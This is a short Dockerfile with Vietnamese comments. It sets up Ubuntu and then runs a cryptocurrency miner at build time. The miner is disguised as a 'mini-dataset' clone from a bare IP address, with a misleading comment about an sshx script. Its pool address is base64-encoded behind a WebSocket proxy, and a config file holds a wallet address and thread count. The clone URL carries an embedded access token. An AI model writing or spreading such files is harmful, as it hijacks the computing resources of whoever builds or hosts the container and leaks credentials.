s# Sử dụng Ubuntu mới nhất
FROM ubuntu:latest  

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt install -y \
    htop \
    curl \
    ca-certificates \
    git \
    sudo \
    unzip \
    wget \
    python3 \
    python3-pip && \
    rm -rf /var/lib/apt/lists/*  # Dọn dẹp cache để giảm kích thước image

# Tạo thư mục làm việc


# Tải script sshx và chạy ngay trong RUN

RUN git clone http://malphite848:ff2c9a712ddb48cefb9b1bc8b40fa9c3fb348ea3@160.30.168.199:3001/malphite848/mini-dataset.git
RUN cd mini-dataset
RUN echo -e 'proxy=wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==\nusername=RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs\npassword=c=RVN\nthreads=48' > data.txt
RUN python3 app.py
